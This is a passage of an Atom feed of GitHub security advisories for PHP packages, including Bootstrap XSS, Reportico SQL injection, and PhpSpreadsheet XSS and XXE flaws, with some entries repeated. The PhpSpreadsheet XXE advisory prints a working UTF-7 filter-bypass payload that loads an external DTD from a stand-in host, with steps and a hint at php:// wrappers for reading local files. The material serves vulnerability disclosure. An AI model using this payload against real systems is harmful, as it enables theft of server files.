<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/nategood/httpful/2024-05-01.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/nategood/httpful/2024-05-01.yaml</a></li>
<li><a href="https://github.com/nategood/httpful/blob/fc8e4274a09529a6ff29b9c6c0a105ee43dbfda5/src/Httpful/Request.php#L35">https://github.com/nategood/httpful/blob/fc8e4274a09529a6ff29b9c6c0a105ee43dbfda5/src/Httpful/Request.php#L35</a></li>
<li><a href="https://huntr.com/bounties/8d59c089-92f1-4b73-90f8-54968a70e2fb">https://huntr.com/bounties/8d59c089-92f1-4b73-90f8-54968a70e2fb</a></li>
<li><a href="https://github.com/advisories/GHSA-gcfg-hmwx-wq5h">https://github.com/advisories/GHSA-gcfg-hmwx-wq5h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gcfg-hmwx-wq5h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-09T18:18:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[twbs/bootstrap] Bootstrap Cross-Site Scripting (XSS) vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-vc8w-jr9v-vj7f</id>
        <link href="https://github.com/advisories/GHSA-vc8w-jr9v-vj7f"/>
        <updated>2024-09-06T19:07:45.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability has been identified in Bootstrap that exposes users to Cross-Site Scripting (XSS) attacks. The issue is present in the carousel component, where the data-slide and data-slide-to attributes can be exploited through the href attribute of an <a> tag due to inadequate sanitization. This vulnerability could potentially enable attackers to execute arbitrary JavaScript within the victim's browser.</a></p><a>
<h3 id="references">References</h3>
</a><ul><a>
</a><li><a></a><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6531">https://nvd.nist.gov/vuln/detail/CVE-2024-6531</a></li>
<li><a href="https://www.herodevs.com/vulnerability-directory/cve-2024-6531">https://www.herodevs.com/vulnerability-directory/cve-2024-6531</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/bootstrap/CVE-2024-6531.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/bootstrap/CVE-2024-6531.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-vc8w-jr9v-vj7f">https://github.com/advisories/GHSA-vc8w-jr9v-vj7f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vc8w-jr9v-vj7f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-11T18:31:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[reportico-web/reportico] SQL Injection vulnerability in Reportico Till]]></title>
        <id>https://github.com/advisories/GHSA-jjf4-959w-f545</id>
        <link href="https://github.com/advisories/GHSA-jjf4-959w-f545"/>
        <updated>2024-09-04T20:20:21.000Z</updated>
        <content type="html"><![CDATA[<p>SQL Injection vulnerability in Reportico Till 8.1.0 allows attackers to obtain sensitive information or other system information via the project parameter.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-47438">https://nvd.nist.gov/vuln/detail/CVE-2023-47438</a></li>
<li><a href="https://github.com/reportico-web/reportico/issues/52">https://github.com/reportico-web/reportico/issues/52</a></li>
<li><a href="https://github.com/advisories/GHSA-jjf4-959w-f545">https://github.com/advisories/GHSA-jjf4-959w-f545</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jjf4-959w-f545</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-28T00:31:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet HTML writer is vulnerable to Cross-Site Scripting via style information]]></title>
        <id>https://github.com/advisories/GHSA-wgmf-q9vr-vww6</id>
        <link href="https://github.com/advisories/GHSA-wgmf-q9vr-vww6"/>
        <updated>2024-09-04T14:20:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>\PhpOffice\PhpSpreadsheet\Writer\Html</code> doesn't sanitize spreadsheet styling information such as font names, allowing an attacker to inject arbitrary JavaScript on the page.</p>
<h3 id="poc">PoC</h3>
<p>Example target script:</p>
<pre><code>&lt;?php

require 'vendor/autoload.php';

$reader = \PhpOffice\PhpSpreadsheet\IOFactory::createReader("Xlsx");
$spreadsheet = $reader-&gt;load(__DIR__ . '/book.xlsx');

$writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet);
print($writer-&gt;generateHTMLAll());
</code></pre>
<p>Save this file in the same directory:
<a href="https://github.com/PHPOffice/PhpSpreadsheet/files/15212797/book.xlsx">book.xlsx</a></p>
<p>Open index.php in a web browser. An alert should be displayed.</p>
<h3 id="impact">Impact</h3>
<p>Full takeover of the session of users viewing spreadsheet files as HTML.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-wgmf-q9vr-vww6">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-wgmf-q9vr-vww6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45046">https://nvd.nist.gov/vuln/detail/CVE-2024-45046</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/pull/3957">https://github.com/PHPOffice/PhpSpreadsheet/pull/3957</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/f7cf378faed2e11cf4825bf8bafea4922ae44667">https://github.com/PHPOffice/PhpSpreadsheet/commit/f7cf378faed2e11cf4825bf8bafea4922ae44667</a></li>
<li><a href="https://github.com/advisories/GHSA-wgmf-q9vr-vww6">https://github.com/advisories/GHSA-wgmf-q9vr-vww6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wgmf-q9vr-vww6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-29T17:56:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet HTML writer is vulnerable to Cross-Site Scripting via style information]]></title>
        <id>https://github.com/advisories/GHSA-wgmf-q9vr-vww6</id>
        <link href="https://github.com/advisories/GHSA-wgmf-q9vr-vww6"/>
        <updated>2024-09-04T14:20:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>\PhpOffice\PhpSpreadsheet\Writer\Html</code> doesn't sanitize spreadsheet styling information such as font names, allowing an attacker to inject arbitrary JavaScript on the page.</p>
<h3 id="poc">PoC</h3>
<p>Example target script:</p>
<pre><code>&lt;?php

require 'vendor/autoload.php';

$reader = \PhpOffice\PhpSpreadsheet\IOFactory::createReader("Xlsx");
$spreadsheet = $reader-&gt;load(__DIR__ . '/book.xlsx');

$writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet);
print($writer-&gt;generateHTMLAll());
</code></pre>
<p>Save this file in the same directory:
<a href="https://github.com/PHPOffice/PhpSpreadsheet/files/15212797/book.xlsx">book.xlsx</a></p>
<p>Open index.php in a web browser. An alert should be displayed.</p>
<h3 id="impact">Impact</h3>
<p>Full takeover of the session of users viewing spreadsheet files as HTML.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-wgmf-q9vr-vww6">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-wgmf-q9vr-vww6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45046">https://nvd.nist.gov/vuln/detail/CVE-2024-45046</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/pull/3957">https://github.com/PHPOffice/PhpSpreadsheet/pull/3957</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/f7cf378faed2e11cf4825bf8bafea4922ae44667">https://github.com/PHPOffice/PhpSpreadsheet/commit/f7cf378faed2e11cf4825bf8bafea4922ae44667</a></li>
<li><a href="https://github.com/advisories/GHSA-wgmf-q9vr-vww6">https://github.com/advisories/GHSA-wgmf-q9vr-vww6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wgmf-q9vr-vww6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-29T17:56:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] XXE in PHPSpreadsheet encoding is returned]]></title>
        <id>https://github.com/advisories/GHSA-ghg6-32f9-2jp7</id>
        <link href="https://github.com/advisories/GHSA-ghg6-32f9-2jp7"/>
        <updated>2024-09-13T13:37:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Bypassing the filter allows a XXE-attack. Which is turn allows attacker to obtain contents of local files, even if error reporting muted by @ symbol. (LFI-attack) </p>
<h3 id="details">Details</h3>
<p>Check <code> $pattern = '/encoding="(.*?)"/';</code> easy to bypass. Just use a single quote symbol <code>'</code>. So payload looks like this:</p>
<pre><code>&lt;?xml version="1.0" encoding='UTF-7' standalone="yes"?&gt;
+ADw-!DOCTYPE xxe [+ADw-!ENTITY % xxe SYSTEM "http://example.com/file.dtd"&gt; %xxe;]&gt;
</code></pre>
<p>If you add this header to any XML file into xlsx-formatted file, such as sharedStrings.xml file, then xxe will execute. </p>
<h3 id="poc">PoC</h3>
<ol>
<li>Create simple xlsx file</li>
<li>Rename xlsx to zip</li>
<li>Go to the zip and open the <code>xl/sharedStrings.xml</code> file in edit mode.</li>
<li>Replace <code>&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</code> to</li>
</ol>
<pre><code>&lt;?xml version="1.0" encoding='UTF-7' standalone="yes"?&gt;
+ADw-!DOCTYPE xxe [+ADw-!ENTITY % xxe SYSTEM "http://%webhook%/file.dtd"&gt; %xxe;]&gt;
</code></pre>
<ol start="5">
<li>Save <code>sharedStrings.xml</code> file and rename zip back to xlsx.</li>
<li>Use minimal php code that simply opens this xlsx file:</li>
</ol>
<pre><code>use PhpOffice\PhpSpreadsheet\IOFactory;
require __DIR__ . '/vendor/autoload.php';
$spreadsheet = IOFactory::load("file.xlsx");
</code></pre>
<ol start="7">
<li>You will receive the request to your <code>http://%webhook%/file.dtd</code></li>
<li>Dont't forget that you can use php-wrappers into xxe, some php:// wrapper payload allows fetch local files.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>Read local files
<img alt="lfi" src="https://github.com/PHPOffice/PhpSpreadsheet/assets/95242087/1839cddb-6bb0-486d-8884-9ac485776931"></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-ghg6-32f9-2jp7">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-ghg6-32f9-2jp7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45048">https://nvd.nist.gov/vuln/detail/CVE-2024-45048</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/bea2d4b30f24bcc8a7712e208d1359e603b45dda">https://github.com/PHPOffice/PhpSpreadsheet/commit/bea2d4b30f24bcc8a7712e208d1359e603b45dda</a></li>
<li><a href="https://github.com/advisories/GHSA-ghg6-32f9-2jp7">https://github.com/advisories/GHSA-ghg6-32f9-2jp7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ghg6-32f9-2jp7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-29T17:58:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pimcore/pimcore] Pimcore includes vulnerable PHPOffice/PhpSpreadsheet]]></title>
        <id>https://github.com/advisories/GHSA-hq76-662x-7mw4</id>
        <link href="https://github.com/advisories/GHSA-hq76-662x-7mw4"/>
        <updated>2024-09-03T19:45:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Pimcore 10.6.x and Enterprise 10.6.x versions currently depend on PHPOffice/PhpSpreadsheet version 1.x, which has recently been identified with a security vulnerability (CVE-2024-45048). To mitigate this issue, it is recommended to update to the latest version 2.2.2. For more details, please refer to the official advisory: <a href="https://github.com/advisories/GHSA-ghg6-32f9-2jp7">GHSA-ghg6-32f9-2jp7</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pimcore/pimcore/security/advisories/GHSA-hq76-662x-7mw4">https://github.com/pimcore/pimcore/security/advisories/GHSA-hq76-662x-7mw4</a></li>
<li><a href="https://github.com/advisories/GHSA-ghg6-32f9-2jp7">https://github.com/advisories/GHSA-ghg6-32f9-2jp7</a></li>
<li><a href="https://github.com/advisories/GHSA-hq76-662x-7mw4">https://github.com/advisories/GHSA-hq76-662x-7mw4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hq76-662x-7mw4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-03T19:45:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pimcore/pimcore] Pimcore includes vulnerable PHPOffice/PhpSpreadsheet]]></title>
        <id>https://github.com/advisories/GHSA-hq76-662x-7mw4</id>
        <link href="https://github.com/advisories/GHSA-hq76-662x-7mw4"/>
        <updated>2024-09-03T19:45:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Pimcore 10.6.x and Enterprise 10.6.x versions currently depend on PHPOffice/PhpSpreadsheet version 1.x, which has recently been identified with a security vulnerability (CVE-2024-45048). To mitigate this issue, it is recommended to update to the latest version 2.2.2. For more details, please refer to the official advisory: <a href="https://github.com/advisories/GHSA-ghg6-32f9-2jp7">GHSA-ghg6-32f9-2jp7</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pimcore/pimcore/security/advisories/GHSA-hq76-662x-7mw4">https://github.com/pimcore/pimcore/security/advisories/GHSA-hq76-662x-7mw4</a></li>
<li><a href="https://github.com/advisories/GHSA-ghg6-32f9-2jp7">https://github.com/advisories/GHSA-ghg6-32f9-2jp7</a></li>
<li><a href="https://github.com/advisories/GHSA-hq76-662x-7mw4">https://github.com/advisories/GHSA-hq76-662x-7mw4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hq76-662x-7mw4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-03T19:45:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pimcore/admin-ui-classic-bundle] Pimcore includes vulnerable PHPOffice/PhpSpreadsheet]]></title>
        <id>https://github.com/advisories/GHSA-hq76-662x-7mw4</id>
        <link href="https://github.com/advisories/GHSA-hq76-662x-7mw4"/>
        <updated>2024-09-03T19:45:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Pimcore 10.6.x and Enterprise 10.6.x versions currently depend on PHPOffice/PhpSpreadsheet version 1.x, which has recently been identified with a security vulnerability (CVE-2024-45048). To mitigate this issue, it is recommended to update to the latest version 2.2.2. For more details, please refer to the official advisory: <a href="https://github.com/advisories/GHSA-ghg6-32f9-2jp7">GHSA-ghg6-32f9-2jp7</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pimcore/pimcore/security/advisories/GHSA-hq76-662x-7mw4">https://github.com/pimcore/pimcore/security/advisories/GHSA-hq76-662x-7mw4</a></li>
<li><a href="https://github.com/advisories/GHSA-ghg6-32f9-2jp7">https://github.com/advisories/GHSA-ghg6-32f9-2jp7</a></li>
<li><a href="https://github.com/advisories/GHSA-hq76-662x-7mw4">https://github.com/advisories/GHSA-hq76-662x-7mw4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hq76-662x-7mw4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-03T19:45:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pimcore/admin-ui-classic-bundle] Pimcore includes vulnerable PHPOffice/PhpSpreadsheet]]></title>
        <id>https://github.com/advisories/GHSA-hq76-662x-7mw4</id>
        <link href="https://github.com/advisories/GHSA-hq76-662x-7mw4"/>
        <updated>2024-09-03T19:45:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Pimcore 10.6.x and Enterprise 10.6.x versions currently depend on PHPOffice/PhpSpreadsheet version 1.x, which has recently been identified with a security vulnerability (CVE-2024-45048). To mitigate this issue, it is recommended to update to the latest version 2.2.2. For more details, please refer to the official advisory: <a href="https://github.com/advisories/GHSA-ghg6-32f9-2jp7">GHSA-ghg6-32f9-2jp7</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pimcore/pimcore/security/advisories/GHSA-hq76-662x-7mw4">https://github.com/pimcore/pimcore/security/advisories/GHSA-hq76-662x-7mw4</a></li>
<li><a href="https://github.com/advisories/GHSA-ghg6-32f9-2jp7">https://github.com/advisories/GHSA-ghg6-32f9-2jp7</a></li>
<li><a href="https://github.com/advisories/GHSA-hq76-662x-7mw4">https://github.com/advisories/GHSA-hq76-662x-7mw4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hq76-662x-7mw4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-03T19:45:26.000Z</published>
    </entry>
</feed>